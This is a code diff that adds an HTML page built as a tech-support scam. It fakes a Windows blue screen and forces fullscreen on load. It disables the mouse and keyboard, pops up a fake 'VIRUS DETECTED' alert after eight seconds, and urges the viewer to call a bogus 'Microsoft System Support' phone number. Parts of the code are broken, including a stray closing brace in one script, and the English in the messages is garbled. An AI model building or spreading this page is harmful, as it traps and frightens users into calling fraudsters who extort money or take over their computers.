@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>:-( Your PC ran into a problem</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      background-color: #1E1EFA; /* More accurate Windows BSOD color */
+      color: white;
+      font-family: Segoe UI, sans-serif;
+      font-size: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: left;
+    }
+    .alert-box {
+      max-width: 800px;
+      padding: 40px;
+    }
+    .alert-box p {
+      margin: 20px 0;
+    }
+    .sad-face {
+      font-size: 60px;
+      margin-bottom: 20px;
+    }
+    .warning {
+      color: RED;
+      font-weight: bold;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    #revealBox {
+      margin-top: 40px;
+      padding: 20px;
+      background-color: white;
+      color: black;
+      border-radius: 10px;
+      display: none;
+    }
+#virusPopup {
+      display: none;
+      position: fixed;
+      top: 20%;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: red;
+      color: white;
+      padding: 30px;
+      border: 3px solid yellow;
+      font-size: 24px;
+      font-weight: bold;
+      z-index: 9999;
+      text-align: center;
+      border-radius: 8px;
+    }
+  </style>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: #0078D7;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      color: white;
+      font-size: 20px;
+      line-height: 1.6;
+      user-select: none;
+      overflow: hidden;
+      pointer-events: none; /* disables mouse */
+    }
+    .container {
+      max-width: 800px;
+      margin: 10% auto;
+      padding: 0 20px;
+    }
+    .emoji {
+      font-size: 90px;
+      margin-bottom: 20px;
+    }
+    .support-box {
+      margin-top: 50px;
+      padding: 20px;
+      background-color: #005A9E;
+      border-left: 4px solid #ffffff;
+    }
+    .support-box strong {
+      font-size: 22px;
+    }
+  </style>
+  <script>
+    window.onload = () => {
+      const goFullscreen = () => {
+        const elem = document.documentElement;
+        if (elem.requestFullscreen) {
+          elem.requestFullscreen();
+        } else if (elem.webkitRequestFullscreen) {
+          elem.webkitRequestFullscreen();
+        } else if (elem.msRequestFullscreen) {
+          elem.msRequestFullscreen();
+        }
+      };
+      goFullscreen();
+
+      // Disable keyboard input
+      window.addEventListener("keydown", e => e.preventDefault());
+      window.addEventListener("keyup", e => e.preventDefault());
+    };
+  </script>
+ <script>
+    
+
+      setTimeout(function() {
+        document.getElementById("virusPopup").style.display = "block";
+      }, 8000); // Show virus popup after 8 seconds
+    };
+  </script>
+</head>
+<body>
+<div id="virusPopup">⚠️ VIRUS DETECTED! Your PC is infected with 3 threats!</div>
+  <div class="alert-box">
+    <div class="sad-face">:(</div>
+    <p>Your PC ran into a problem . We're just collecting some error info, and do not restart file lost possible.</p>
+    <p>For more information about this issue and possible fixes call a support person, give them this info </p>
+    <p><strong>Stop code:</strong> CRITICAL_PROCESS_DIED_FILE_CORRUPTED⚠️⚠️⚠️</p>
+<div class="support-box">
+      <strong>Microsoft System Support</strong><br>
+      📞 Toll-Free: <strong>1-888-123-4567</strong><br>
+      Support ID: WIN-ERR-0x80070057<br>
+      Service Hours: 24x7
+    </div>
+    <p class="warning">DO NOT shut down your system. Serious file system corruption detected.</p>
+    <div id="revealBox">
+      <h2>detected with virus</h2>
+      <p>file system corrupted.</p>
+      <p>Support microsoft team now <strong>1-888-123-4567</strong>.</p>
+      <p>For help call now </a></p>
+    </div>
+  </div>
+</body>
+</html>
